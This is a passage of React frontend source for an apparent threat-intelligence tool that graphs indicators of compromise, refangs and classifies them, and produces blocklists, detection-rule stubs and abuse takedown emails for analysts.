import React, { useEffect, useRef, useState, useCallback } from 'react'
import Login from './Login.jsx'
import AdminPanel from './AdminPanel.jsx'
import ShareModal from './ShareModal.jsx'
import SharedView from './SharedView.jsx'
import cytoscape from 'cytoscape'
import coseBilkent from 'cytoscape-cose-bilkent'

cytoscape.use(coseBilkent)

const NODE_COLORS = {
  domain: '#79c0ff', ip: '#ffa657', hash: '#d2a8ff', url: '#56d364',
  cert: '#3fb950', asn: '#e3b341', email: '#f78166', registrar: '#8b949e',
  ns: '#58a6ff', favicon: '#e3b341', jarm: '#bc8cff', report: '#f5a623',
  country: '#ff7b72', person: '#ff80b3', command_line: '#f0883e',
  executable_name: '#ffb86b', wallet_address: '#f1c40f',
  username: '#a371f7', ja3: '#caa6ff', ja3s: '#9d7fe0',
  threat_actor: '#ff5c8a'
}
const NODE_SHAPES = {
  domain: 'ellipse', ip: 'rectangle', ns: 'diamond', registrar: 'hexagon',
  cert: 'round-rectangle', asn: 'barrel', hash: 'triangle', report: 'concave-hexagon',
  jarm: 'pentagon', url: 'cut-rectangle', country: 'tag', person: 'star',
  command_line: 'rhomboid', executable_name: 'vee',
  email: 'round-tag', wallet_address: 'rhomboid', username: 'star',
  ja3: 'heptagon', ja3s: 'octagon', threat_actor: 'star'
}
const STATUS_COLOR = { running: '#e3b341', done: '#56d364', cleared: '#8b949e',
                       error: '#f85149', quota_exceeded: '#d29922' }

// Render a unix-epoch reset time as a "Xh Ym Zs" countdown relative to now.
// Returns '' once the reset epoch has passed so the caller can swap the UI to
// a "ready to resume" affordance.
function formatCountdown(epochSeconds) {
  if (!epochSeconds) return ''
  const secsLeft = Math.max(0, Math.round(epochSeconds - Date.now() / 1000))
  if (secsLeft <= 0) return ''
  const h = Math.floor(secsLeft / 3600)
  const m = Math.floor((secsLeft % 3600) / 60)
  const s = secsLeft % 60
  if (h > 0) return `${h}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s`
  if (m > 0) return `${m}m ${s.toString().padStart(2, '0')}s`
  return `${s}s`
}

// ── Maltego entity type mapping ──────────────────────────────────────────────
// Maps bounce-cti node.type -> Maltego entity type string. The paste format is
// `<maltego_entity_type>#<value>` (one per line). Falsy return = skip this type.
const MALTEGO_TYPES = {
  domain:    () => 'maltego.Domain',
  ip:        v  => v.includes(':') ? 'maltego.IPv6Address' : 'maltego.IPv4Address',
  hash:      () => 'maltego.Hash',
  url:       () => 'maltego.URL',
  cert:      () => 'maltego.X509Certificate',
  asn:       () => 'maltego.AS',
  email:     () => 'maltego.EmailAddress',
  ns:        () => 'maltego.NSRecord',
  registrar: () => 'maltego.Organization',
  favicon:   () => 'maltego.Phrase',
  jarm:      () => 'maltego.Phrase',
  ja3:       () => 'maltego.Phrase',
  ja3s:      () => 'maltego.Phrase',
  country:   () => 'maltego.Location.Country',
  person:    () => 'maltego.Person',
  command_line: () => 'maltego.Phrase',
  executable_name: () => 'maltego.File',
  wallet_address: () => 'maltego.Phrase',
  username:  () => 'maltego.Alias',
  report:    () => null,
}

const wsMap = {}

// Tracks whether the viewport is in mobile width range. We expose drawer toggles
// and tweak interaction behavior (auto-open right panel on node tap, auto-close
// sidebar after starting an investigation, etc.) when this is true.
function useIsMobile(query = '(max-width: 768px)') {
  const [isMobile, setIsMobile] = useState(() => {
    if (typeof window === 'undefined' || !window.matchMedia) return false
    return window.matchMedia(query).matches
  })
  useEffect(() => {
    if (typeof window === 'undefined' || !window.matchMedia) return
    const mq = window.matchMedia(query)
    const handler = (e) => setIsMobile(e.matches)
    if (mq.addEventListener) mq.addEventListener('change', handler)
    else mq.addListener(handler)
    return () => {
      if (mq.removeEventListener) mq.removeEventListener('change', handler)
      else mq.removeListener(handler)
    }
  }, [query])
  return isMobile
}

// Agent-provided fields can occasionally be objects (e.g. {type, value}) instead
// of strings. Coerce to a display string so rendering never throws React #31.
function iocString(v) {
  if (v == null) return ''
  if (typeof v === 'string') return v
  if (typeof v === 'object' && typeof v.value === 'string') return v.value
  return String(v)
}

// Refang defanged IOC notation — accepts `evil[.]com`, `hxxps://bad(.)site`,
// `user[at]evil[dot]com`, etc. Safe on already-live strings (no-op).
function refang(s) {
  if (!s || typeof s !== 'string') return s
  let out = s.trim()
  // Strip surrounding angle brackets analysts sometimes add: `<evil[.]com>`.
  while (out.length > 1 && out.startsWith('<') && out.endsWith('>')) {
    out = out.slice(1, -1).trim()
  }
  out = out
    .replace(/\[\.\]/g, '.')
    .replace(/\(\.\)/g, '.')
    .replace(/\{\.\}/g, '.')
    .replace(/\[:\]/g, ':')
    .replace(/\[\/\]/g, '/')
    .replace(/\[@\]/g, '@')
    .replace(/\[\s*dot\s*\]/gi, '.')
    .replace(/\(\s*dot\s*\)/gi, '.')
    .replace(/\{\s*dot\s*\}/gi, '.')
    .replace(/\[\s*at\s*\]/gi, '@')
    .replace(/\(\s*at\s*\)/gi, '@')
    .replace(/\bhxxps\b/gi, 'https')
    .replace(/\bhxxp\b/gi, 'http')
    .replace(/\bfxp\b/gi, 'ftp')
  return out.trim()
}

// Auto-detect IOC type from a (refanged) value.
// Keep in sync with backend/main.py:detect_seed_type.
const EXEC_EXTENSIONS_RE = /\.(exe|dll|sys|scr|bat|cmd|ps1|vbs|vbe|hta|pif|wsh|wsf|jse|msi|ocx|drv|lnk|dylib|elf)$/i
function detectIOCType(raw, vertical = 'cti') {
  const v = refang(raw).trim()
  if (!v) return 'domain'
  // OSINT: an @-prefixed handle is unambiguously an identity seed.
  if (vertical === 'osint' && /^@[A-Za-z0-9._-]{1,64}$/.test(v)) return 'username'
  if (/^(https?|ftp):\/\//i.test(v)) return 'url'
  if (/^(as|asn)\s*\d{1,10}$/i.test(v)) return 'asn'
  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(v)) return 'ip'
  if (/^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$/.test(v)) return 'ip'
  if (/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(v)) return 'email'
  if (/^0x[a-fA-F0-9]{40}$/.test(v)) return 'wallet_address'
  if (/^(bc1|tb1)[a-z0-9]{6,87}$/.test(v)) return 'wallet_address'
  if (/^[48][1-9A-HJ-NP-Za-km-z]{94}$/.test(v)) return 'wallet_address'
  if (/^[0-9a-fA-F]{62}$/.test(v)) return 'jarm'
  if (/^[0-9a-fA-F]{64}$/.test(v)) return 'hash'
  if (/^[0-9a-fA-F]{40}$/.test(v)) return 'hash'
  if (/^[0-9a-fA-F]{32}$/.test(v)) return 'hash'
  // Executable filename before domain: "malware.exe" matches the domain regex
  // too, but the filename interpretation is what the analyst wants.
  if (!/\s/.test(v) && EXEC_EXTENSIONS_RE.test(v)) return 'executable_name'
  if (/^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/.test(v)) return 'domain'
  // Legacy BTC Base58 — checked LAST because the 1.../3... pattern collides
  // with arbitrary strings. Must be ≥25 chars and Base58 alphabet only.
  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(v)) return 'wallet_address'
  // OSINT fallback: anything not matching a structured IOC above (a bare
  // handle like "darkcoder" or "john_doe") is treated as a username, not a
  // domain. CTI keeps the historical domain fallback.
  return vertical === 'osint' ? 'username' : 'domain'
}

// ── HighlightedText ──────────────────────────────────────────────────────────
function HighlightedText({ text, nodeValues, onNodeClick }) {
  const str = typeof text === 'string' ? text : iocString(text)
  if (!str) return null
  const tokens = str.split(/(\s+)/)
  return (
    <span>
      {tokens.map((token, i) => {
        const stripped = token.replace(/^[.,;:!?()"']+|[.,;:!?()"']+$/g, '')
        const id = nodeValues.get(token) || nodeValues.get(stripped)
        if (id) {
          return (
            <span
              key={i}
              className="ioc-link"
              onClick={() => onNodeClick(id)}
            >
              {token}
            </span>
          )
        }
        return <React.Fragment key={i}>{token}</React.Fragment>
      })}
    </span>
  )
}

// ── ActionsPanel ─────────────────────────────────────────────────────────
// Operational deliverables for a finished investigation. Three cards:
// Blocklist, Detection rules, Takedown. Each opens a formatted artifact
// the analyst can paste straight into a firewall / SIEM / abuse form.
function ActionsPanel({ activeInv, graphReady }) {
  const [mode, setMode] = React.useState(null)   // 'block' | 'detect' | 'takedown'
  const [format, setFormat] = React.useState('plain')
  const [includeDefused, setIncludeDefused] = React.useState(false)
  const [content, setContent] = React.useState('')
  const [takedown, setTakedown] = React.useState(null)
  const [loading, setLoading] = React.useState(false)
  const [copied, setCopied] = React.useState(false)
  const [err, setErr] = React.useState('')

  const blockFormats = [
    { id: 'plain',     label: 'Plain text',  ext: 'txt'   },
    { id: 'hosts',     label: 'hosts file',  ext: 'txt'   },
    { id: 'unbound',   label: 'Unbound',     ext: 'conf'  },
    { id: 'rpz',       label: 'BIND RPZ',    ext: 'zone'  },
    { id: 'palo_edl',  label: 'Palo EDL',    ext: 'txt'   },
    { id: 'cisco_acl', label: 'Cisco ACL',   ext: 'cfg'   },
    { id: 'csv',       label: 'CSV',         ext: 'csv'   },
  ]
  const detectFormats = [
    { id: 'sigma', label: 'Sigma', ext: 'yml'   },
    { id: 'snort', label: 'Snort', ext: 'rules' },
    { id: 'yara',  label: 'YARA',  ext: 'yar'   },
  ]

  React.useEffect(() => {
    setMode(null)
    setContent('')
    setTakedown(null)
    setErr('')
  }, [activeInv])

  const load = React.useCallback(async (which, fmt) => {
    if (!activeInv) return
    setLoading(true)
    setErr('')
    setContent('')
    setTakedown(null)
    try {
      if (which === 'block') {
        const params = new URLSearchParams({ fmt, include_defused: includeDefused ? '1' : '0' })
        const r = await fetch(`/api/investigations/${activeInv}/actions/blocklist?${params}`,
                              { credentials: 'same-origin' })
        if (!r.ok) throw new Error((await r.json()).detail || `HTTP ${r.status}`)
        const j = await r.json()
        setContent(j.content || '')
      } else if (which === 'detect') {
        const params = new URLSearchParams({ fmt, include_defused: includeDefused ? '1' : '0' })
        const r = await fetch(`/api/investigations/${activeInv}/actions/detection?${params}`,
                              { credentials: 'same-origin' })
        if (!r.ok) throw new Error((await r.json()).detail || `HTTP ${r.status}`)
        const j = await r.json()
        setContent(j.content || '')
      } else if (which === 'takedown') {
        const r = await fetch(`/api/investigations/${activeInv}/actions/takedown`,
                              { credentials: 'same-origin' })
        if (!r.ok) throw new Error((await r.json()).detail || `HTTP ${r.status}`)
        const j = await r.json()
        setTakedown(j)
      }
    } catch (e) {
      setErr(String(e.message || e))
    } finally {
      setLoading(false)
    }
  }, [activeInv, includeDefused])

  const open = (which) => {
    setMode(which)
    setCopied(false)
    if (which === 'block') { setFormat('plain'); load('block', 'plain') }
    else if (which === 'detect') { setFormat('sigma'); load('detect', 'sigma') }
    else if (which === 'takedown') { load('takedown') }
  }

  const switchFormat = (fmt) => {
    setFormat(fmt)
    setCopied(false)
    load(mode, fmt)
  }

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(content)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    } catch (_) {}
  }

  const download = () => {
    if (!content) return
    const formats = mode === 'block' ? blockFormats : detectFormats
    const meta = formats.find(f => f.id === format) || { ext: 'txt' }
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `bounce-cti-${activeInv}.${mode}.${format}.${meta.ext}`
    document.body.appendChild(a); a.click(); a.remove()
    URL.revokeObjectURL(url)
  }

  if (!activeInv) {
    return <p className="hint">Pick an investigation first.</p>
  }
  if (!graphReady) {
    return <p className="hint">Graph is still loading. Once nodes are in, come back here for blocklists / takedown emails / detection rules.</p>
  }

  return (
    <div className="actions-panel">
      <div className="actions-intro">
        Operational deliverables built from the graph. Defused noise (CDN /
        parking / sinkhole / Tor) is excluded by default — toggle the
        checkbox if you have audited a defused indicator and want it
        included.
      </div>

      <label className="actions-defuse-toggle">
        <input
          type="checkbox"
          checked={includeDefused}
          onChange={e => {
            setIncludeDefused(e.target.checked)
            if (mode === 'block' || mode === 'detect') load(mode, format)
          }}
        />
        Include defused indicators
      </label>

      <div className="actions-cards">
        <button
          className={`action-card${mode === 'block' ? ' active' : ''}`}
          onClick={() => open('block')}
        >
          <div className="action-card-icon">🛑</div>
          <div className="action-card-body">
            <div className="action-card-title">Blocklist</div>
            <div className="action-card-desc">Firewall / DNS / EDR drop-list in 7 formats</div>
          </div>
        </button>

        <button
          className={`action-card${mode === 'takedown' ? ' active' : ''}`}
          onClick={() => open('takedown')}
        >
          <div className="action-card-icon">✉</div>
          <div className="action-card-body">
            <div className="action-card-title">Takedown</div>
            <div className="action-card-desc">Abuse-contact emails ready to send, one per host</div>
          </div>
        </button>

        <button
          className={`action-card${mode === 'detect' ? ' active' : ''}`}
          onClick={() => open('detect')}
        >
          <div className="action-card-icon">🔍</div>
          <div className="action-card-body">
            <div className="action-card-title">Detection</div>
            <div className="action-card-desc">Sigma / Snort / YARA starter rule</div>
          </div>
        </button>
      </div>

      {err && <div className="actions-error">⚠ {err}</div>}

      {(mode === 'block' || mode === 'detect') && !err && (
        <div className="actions-output">
          <div className="actions-format-row">
            {(mode === 'block' ? blockFormats : detectFormats).map(f => (
              <button
                key={f.id}
                className={`format-pill${format === f.id ? ' active' : ''}`}
                onClick={() => switchFormat(f.id)}
              >
                {f.label}
              </button>
            ))}
            <div style={{ flex: 1 }} />
            <button
              className="btn-sm secondary"
              onClick={copy}
              disabled={!content}
              title="Copy to clipboard"
            >
              {copied ? '✓ copied' : '⧉ copy'}
            </button>
            <button
              className="btn-sm secondary"
              onClick={download}
              disabled={!content}
              title="Download file"
            >
              ↓ file
            </button>
          </div>
          {loading && <div className="actions-loading">Rendering…</div>}
          {!loading && (
            <pre className="actions-output-pre">{content || '(no actionable IOCs in this graph)'}</pre>
          )}
        </div>
      )}

      {mode === 'takedown' && !err && (
        <div className="actions-takedown">
          {loading && <div className="actions-loading">Building takedown bundles…</div>}
          {!loading && takedown && takedown.count === 0 && (
            <div className="actions-empty">
              No host has a known abuse contact yet. Run the investigation
              long enough for RDAP / WHOIS to populate the registrar /
              abuse_email fields on the seed nodes.
            </div>
          )}
          {!loading && takedown && takedown.count > 0 && (
            <>
              <div className="takedown-summary">
                {takedown.count} target{takedown.count !== 1 ? 's' : ''} with known abuse contact
              </div>
              {takedown.items.map((t, i) => (
                <TakedownCard key={i} item={t} />
              ))}
            </>
          )}
        </div>
      )}
    </div>
  )
}

function TakedownCard({ item }) {
  const [copied, setCopied] = React.useState('')
  const copyText = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(label)
      setTimeout(() => setCopied(''), 1400)
    } catch (_) {}
  }
  return (
    <div className="takedown-card">
      <div className="takedown-card-header">
        <div className="takedown-card-target">
          <span className="takedown-target-type">{item.target.type}</span>
          <span className="takedown-target-value">{item.target.value}</span>
        </div>
        <div className="takedown-card-meta">
          {item.registrar && <span title="Registrar / Network operator">{item.registrar}</span>}
          {item.asn && <span className="takedown-asn">{item.asn}</span>}
        </div>
      </div>
      <div className="takedown-card-row">
        <span className="takedown-card-label">To:</span>
        <span className="takedown-card-email">{item.abuse_email}</span>
      </div>
      <div className="takedown-card-row">
        <span className="takedown-card-label">Subject:</span>
        <span className="takedown-card-subject">{item.subject}</span>
      </div>
      <details className="takedown-card-body">
        <summary>Preview email body</summary>
        <pre className="takedown-body-pre">{item.body}</pre>
      </details>
      <div className="takedown-card-actions">
        <a
          href={item.mailto}
          className="btn-sm"
          target="_blank"
          rel="noopener noreferrer"
          title="Open this in your default mail client"
        >
          ✉ Open in mail client
        </a>
        <button className="btn-sm secondary" onClick={() => copyText(item.abuse_email, 'email')}>
          {copied === 'email' ? '✓' : '⧉'} address
        </button>
        <button className="btn-sm secondary" onClick={() => copyText(item.subject, 'subject')}>
          {copied === 'subject' ? '✓' : '⧉'} subject
        </button>
        <button className="btn-sm secondary" onClick={() => copyText(item.body, 'body')}>
          {copied === 'body' ? '✓' : '⧉'} body
        </button>
      </div>
    </div>
  )
}

function MainApp({ onLogout, isAdmin, allowedModels, userId }) {
  // Unified IOC input — single textarea handles both single-IOC and multi-IOC
  // input. The submit handler detects the line count and routes to the
  // appropriate endpoint. Type is always auto-detected from the value.
  const [seedText, setSeedText] = useState('')
  // 'ioc' | 'pdf' — two ways to start an investigation. The IOC mode unifies
  // what used to be 'single' and 'batch' (paste one IOC or a list, same input).
  const [inputMode, setInputMode] = useState('ioc')
  const [model, setModel] = useState('sonnet')
  // Vertical (product lens) the new investigation runs under: 'cti' (default)
  // or 'osint'. Persisted so the analyst's last choice survives reloads. The
  // selectable list is fetched from /api/verticals so the UI stays in sync
  // with the backend registry instead of hardcoding.
  const [vertical, setVertical] = useState(() => {
    try { return localStorage.getItem('bounce-vertical') || 'cti' } catch { return 'cti' }
  })
  const [verticals, setVerticals] = useState([])
  useEffect(() => {
    try { localStorage.setItem('bounce-vertical', vertical) } catch { /* ignore */ }
  }, [vertical])
  useEffect(() => {
    fetch('/api/verticals').then(r => r.ok ? r.json() : []).then(setVerticals).catch(() => {})
  }, [])
  // Extended-thinking effort level passed to the agent (CLI --effort). ''
  // means "use the model default". Persisted so it survives reloads.
  const [effort, setEffort] = useState(() => {
    try { return localStorage.getItem('bounce-effort') || '' } catch { return '' }
  })
  useEffect(() => {
    try { localStorage.setItem('bounce-effort', effort) } catch { /* ignore */ }
  }, [effort])
  const [adminOpen, setAdminOpen] = useState(false)
  const [shareOpen, setShareOpen] = useState(false)
  // PDF-import: kind='pdf' adds a third option to the New Investigation
  // segmented control. We intentionally don't put the file picker behind
  // a mode switch on mobile — too many taps. Instead we expose it directly
  // via the "Importer un rapport PDF" affordance the segmented control
  // reveals when active.
  const [pdfFile, setPdfFile] = useState(null)
  const [pdfBusy, setPdfBusy] = useState(false)
  const [pdfError, setPdfError] = useState('')
  const pdfFileInputRef = useRef(null)
  const pdfAddSeedInputRef = useRef(null)
  // 'Sample' mode: an uploaded malware sample / dropper / script OR a pasted
  // command line. The two affordances live in the same tab; whichever one
  // the analyst fills in wins (file > paste when both are provided).
  const [sampleFile, setSampleFile] = useState(null)
  const [sampleText, setSampleText] = useState('')
  const [sampleBusy, setSampleBusy] = useState(false)
  const [sampleError, setSampleError] = useState('')
  const sampleFileInputRef = useRef(null)
  useEffect(() => { /* model-coercion */
    if (allowedModels && allowedModels.length && !allowedModels.includes(model)) {
      setModel(allowedModels[0])
    }
  }, [allowedModels])
  const [invs, setInvs] = useState([])
  const [activeInv, setActiveInv] = useState(null)
  const [selected, setSelected] = useState(null)
  const [events, setEvents] = useState([])
  const [report, setReport] = useState(null)
  // Phase-1.5 hypothesis report node ("working_hypothesis"). Surfaced in the
  // Report tab instead of cluttering the graph as a separate node.
  const [hypothesis, setHypothesis] = useState(null)
  // Snapshot of the graph state at the moment the hypothesis was (re)written,
  // so we can show a freshness signal ("12 new nodes since"). The hypothesis
  // is a phase-1.5 commit on the first ~8 observations; after the full
  // pivot drain the graph has often grown 10×, and the analyst should know
  // whether the early guess still reflects what's on screen.
  const [hypothesisStamp, setHypothesisStamp] = useState(null)
  // When the user clicks the "merge into…" icon on a History row we stash
  // its inv id here and reveal an inline target-picker. Null = picker hidden.
  const [mergePickerSrc, setMergePickerSrc] = useState(null)
  // Per-investigation budget-extension log entries (R4). Internal accounting
  // — kept off the graph and shown compactly in the Report tab.
  const [budgetLog, setBudgetLog] = useState([])
  const [copied, setCopied] = useState(false)
  const [nodeValues, setNodeValues] = useState(new Map())
  const [filterTypes, setFilterTypes] = useState(new Set())
  const [showEdgeLabels, setShowEdgeLabels] = useState(true)
  const [rightTab, setRightTab] = useState('report')
  const [evidenceData, setEvidenceData] = useState(null)
  const [evidenceLoading, setEvidenceLoading] = useState(false)
  const [agentNotes, setAgentNotes] = useState([])
  const [expandedReasoning, setExpandedReasoning] = useState(() => new Set())
  // Cross-investigation hits for the currently selected node — fetched on
  // demand once per (inv, node) pair. ``null`` = not loaded, ``[]`` = loaded
  // and empty (no prior investigations contain this IOC).
  const [crossInvHits, setCrossInvHits] = useState(null)
  const [crossInvLoading, setCrossInvLoading] = useState(false)
  const [customPrompt, setCustomPrompt] = useState('')
  const [promptBusy, setPromptBusy] = useState(false)
  // Optimistic pending prompt: shows the user's message in the chat immediately
  // while the agent is working. Cleared when prompt_history grows.
  const [pendingPrompt, setPendingPrompt] = useState(null)
  const [existingTypes, setExistingTypes] = useState(new Set())
  const [existingRelations, setExistingRelations] = useState(new Set())
  // Multi-selection for "copy / export" scope. Ctrl/Cmd/Shift + click toggles
  // a node into this set without touching the single-click details panel.
  // Empty set == "all nodes" (implicit select-all).
  const [pickedIds, setPickedIds] = useState(new Set())
  const [nodeCount, setNodeCount] = useState(0)
  const [graphSearch, setGraphSearch] = useState('')
  const [searchMatches, setSearchMatches] = useState(0)
  const [batchCombined, setBatchCombined] = useState(true)
  // Live edit state for the Node tab's user_note input. We keep a draft so
  // typing doesn't write on every keystroke, and reset it whenever the
  // selected node changes (a fresh node = a fresh empty draft).
  const [noteDraft, setNoteDraft] = useState('')
  const [noteBusy, setNoteBusy] = useState(false)
  // Toolbar toggles: show analyst pins / notes inline on the graph. Both
  // can be flipped independently to manage visual pollution on dense
  // graphs (Quentin's request).
  const [showPins, setShowPins] = useState(true)
  const [showNotes, setShowNotes] = useState(true)
  // Hidden edge relations — kept frontend-only so muting a noisy relation
  // (e.g. `co_resolves` or `had_resolution`) doesn't lose data, just hides.
  const [filterRelations, setFilterRelations] = useState(new Set())
  const showPinsRef = useRef(true)
  const showNotesRef = useRef(true)
  const filterRelationsRef = useRef(filterRelations)
  // Add-seed form: attach a new PEER IOC to the currently open investigation.
  // Type is always auto-detected — no override dropdown.
  const [addSeedValue, setAddSeedValue] = useState('')
  // Service-restart banner + reconnect state. `serverDown=true` means the
  // backend sent us a `server_shutdown` frame (e.g. `systemctl restart`); we
  // display a banner and poll /api/auth/me until the service is back, then
  // reload so all stale state (WS, timers, in-flight fetches) is replaced.
  const [serverDown, setServerDown] = useState(false)
  // Global Claude-subscription quota state. Populated by polling /api/quota,
  // which the backend updates whenever a `claude -p` invocation reports a
  // usage-limit error. While `quotaState.exhausted` is true, new
  // investigations are refused (HTTP 429) and the per-inv Resume button
  // stays disabled until the reset epoch passes.
  const [quotaState, setQuotaState] = useState({ exhausted: false, exhausted_until: null, message: null })
  const [, setQuotaTick] = useState(0)
  // Right panel default bumped to 460px so the "Partager" button + first lines
  // of the description/report aren't cropped at common laptop widths. Both
  // values persist to localStorage so a manual resize is remembered.
  const [leftWidth, setLeftWidth] = useState(() => {
    try {
      const v = parseInt(window.localStorage.getItem('bounce.leftWidth') || '', 10)
      if (Number.isFinite(v) && v >= 180 && v <= 520) return v
    } catch (_) { /* ignore */ }
    return 260
  })
  const [rightWidth, setRightWidth] = useState(() => {
    try {
      const v = parseInt(window.localStorage.getItem('bounce.rightWidth') || '', 10)
      if (Number.isFinite(v) && v >= 220 && v <= 620) return v
    } catch (_) { /* ignore */ }
    return 460
  })
  const isMobile = useIsMobile()
  const [mobileLeftOpen, setMobileLeftOpen] = useState(false)
  const [mobileRightOpen, setMobileRightOpen] = useState(false)
  // On phones the node-type / edge-type filter chips used to occupy the lower
  // half of the graph permanently. They now collapse behind a toggle so the
  // canvas stays usable; desktop always shows them (CSS gates the toggle).
  const [mobileFiltersOpen, setMobileFiltersOpen] = useState(false)
  const [theme, setTheme] = useState(() => {
    try { return document.documentElement.getAttribute('data-theme') === 'light' ? 'light' : 'dark' }
    catch { return 'dark' }
  })

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme)
    try { localStorage.setItem('bounce-theme', theme) } catch { /* ignore */ }
  }, [theme])

  const cyRef = useRef(null)
  const containerRef = useRef(null)
  const activeInvRef = useRef(null)
  const showEdgeLabelsRef = useRef(showEdgeLabels)
  const filterTypesRef = useRef(filterTypes)
  const leftWidthRef = useRef(leftWidth)
  const rightWidthRef = useRef(rightWidth)
  const dragStateRef = useRef(null)
  const chatEndRef = useRef(null)

  useEffect(() => { activeInvRef.current = activeInv }, [activeInv])

  // Sync activeInv ↔ URL (?inv=<id>) so that:
  //   - hard refresh keeps the investigation you were viewing,
  //   - browser back/forward navigates between recently-opened investigations,
  //   - the URL is shareable / pinnable.
  // Uses replaceState (not pushState) on natural switching so the back button
  // doesn't accumulate one entry per investigation click within a session.
  useEffect(() => {
    try {
      const sp = new URLSearchParams(window.location.search)
      const cur = sp.get('inv') || null
      if (activeInv === cur) return
      if (activeInv) sp.set('inv', activeInv)
      else sp.delete('inv')
      const url = window.location.pathname + (sp.toString() ? '?' + sp.toString() : '')
      window.history.replaceState({}, '', url)
    } catch (_) { /* ignore */ }
  }, [activeInv])
  useEffect(() => { showEdgeLabelsRef.current = showEdgeLabels }, [showEdgeLabels])
  useEffect(() => { filterTypesRef.current = filterTypes }, [filterTypes])
  useEffect(() => { filterRelationsRef.current = filterRelations }, [filterRelations])
  useEffect(() => { showPinsRef.current = showPins }, [showPins])
  useEffect(() => { showNotesRef.current = showNotes }, [showNotes])
  // Reset note draft whenever the selected node changes so we never
  // accidentally write the previous node's draft onto a new selection.
  useEffect(() => {
    if (selected) {
      setNoteDraft((selected.metadata?.user_note) || '')
    } else {
      setNoteDraft('')
    }
  }, [selected?.id])
  useEffect(() => {
    leftWidthRef.current = leftWidth
    try { window.localStorage.setItem('bounce.leftWidth', String(leftWidth)) } catch (_) {}
  }, [leftWidth])
  useEffect(() => {
    rightWidthRef.current = rightWidth
    try { window.localStorage.setItem('bounce.rightWidth', String(rightWidth)) } catch (_) {}
  }, [rightWidth])

  // Keep cytoscape sized correctly when crossing the mobile breakpoint or when
  // mobile drawers slide in/out (the graph container's effective area shifts).
  useEffect(() => {
    if (!cyRef.current) return
    const id = setTimeout(() => {
      try { cyRef.current.resize() } catch (_) {}
    }, 320)
    return () => clearTimeout(id)
  }, [isMobile, mobileLeftOpen, mobileRightOpen])

  // Reset mobile drawer state when leaving mobile so they don't keep an
  // off-canvas transform applied if the user resizes their window.
  useEffect(() => {
    if (!isMobile) {
      setMobileLeftOpen(false)
      setMobileRightOpen(false)
    }
  }, [isMobile])

  // ── Panel resize drag handlers ───────────────────────────────────────────
  useEffect(() => {
    const onMouseMove = (e) => {
      if (!dragStateRef.current) return
      const { side, startX, startWidth } = dragStateRef.current
      const dx = e.clientX - startX
      if (side === 'left') {
        setLeftWidth(Math.max(180, Math.min(520, startWidth + dx)))
      } else {
        setRightWidth(Math.max(220, Math.min(620, startWidth - dx)))
      }
    }
    const onMouseUp = () => {
      if (!dragStateRef.current) return
      dragStateRef.current = null
      document.body.style.cursor = ''
      document.body.style.userSelect = ''
    }
    document.addEventListener('mousemove', onMouseMove)
    document.addEventListener('mouseup', onMouseUp)
    return () => {
      document.removeEventListener('mousemove', onMouseMove)
      document.removeEventListener('mouseup', onMouseUp)
    }
  }, [])

  const startDrag = useCallback((side) => (e) => {
    e.preventDefault()
    dragStateRef.current = {
      side,
      startX: e.clientX,
      startWidth: side === 'left' ? leftWidthRef.current : rightWidthRef.current,
    }
    document.body.style.cursor = 'col-resize'
    document.body.style.userSelect = 'none'
  }, [])

  // ── Chat auto-scroll + clear pending prompt when history updates ─────────
  const promptHistoryLen = (report?.prompt_history || []).length
  useEffect(() => {
    if (chatEndRef.current) {
      chatEndRef.current.scrollIntoView({ behavior: 'smooth' })
    }
    // Agent finished and wrote a new prompt_history entry → clear optimistic state
    if (pendingPrompt && promptHistoryLen > (pendingPrompt.prevLen ?? 0)) {
      setPendingPrompt(null)
      setPromptBusy(false)
    }
  }, [promptHistoryLen, rightTab])

  // ── Cross-investigation lookup for the selected node ─────────────────────
  // When the analyst clicks a node we fetch the list of OTHER investigations
  // (same user) where the same (type, value) was already observed. This is
  // the convergence signal: repeat infrastructure across campaigns.
  useEffect(() => {
    setCrossInvHits(null)
    if (!activeInv || !selected || selected.type === 'report') return
    let cancelled = false
    setCrossInvLoading(true)
    fetch(`/api/investigations/${activeInv}/nodes/${selected.id}/cross_investigations`,
          { credentials: 'same-origin' })
      .then(r => r.ok ? r.json() : null)
      .then(j => { if (!cancelled && j) setCrossInvHits(j.hits || []) })
      .catch(() => {})
      .finally(() => { if (!cancelled) setCrossInvLoading(false) })
    return () => { cancelled = true }
  }, [activeInv, selected?.id, selected?.type])

  // ── Cytoscape init ───────────────────────────────────────────────────────
  useEffect(() => {
    cyRef.current = cytoscape({
      container: containerRef.current,
      style: [
        {
          selector: 'node',
          style: {
            'background-color': ele => NODE_COLORS[ele.data('type')] || '#8b949e',
            'shape': ele => NODE_SHAPES[ele.data('type')] || 'ellipse',
            // Node label is composed live so the pin / note toolbar
            // toggles take effect without re-ingesting the graph:
            //   📌  if pinned and showPins is on
            //   <truncated value>
            //   · <user_note> if note exists and showNotes is on
            'label': ele => {
              const d = ele.data()
              const base = d.label || ''
              const pinned = d.pinned && showPinsRef.current ? '📌 ' : ''
              const note = (d.metadata?.user_note && showNotesRef.current)
                ? `\n· ${d.metadata.user_note}`
                : ''
              return pinned + base + note
            },
            'text-wrap': 'wrap',
            'color': '#e6edf3',
            'font-size': 10,
            'text-valign': 'bottom',
            'text-margin-y': 5,
            'width': ele => ele.data('type') === 'report' ? 38 : 22,
            'height': ele => ele.data('type') === 'report' ? 38 : 22,
            'border-width': 2,
            'border-color': '#30363d',
          }
        },
        {
          selector: 'node[?seed]',
          style: { 'width': 32, 'height': 32, 'border-width': 3, 'border-color': '#f0f6fc', 'font-weight': 'bold' }
        },
        // Analyst-pinned nodes: gold halo + thicker border, plus an
        // emoji prefix in the label (turned on/off via showPinsRef).
        {
          selector: 'node[?pinned]',
          style: {
            'border-color': '#fbbf24',
            'border-width': 4,
            'shadow-blur': 14,
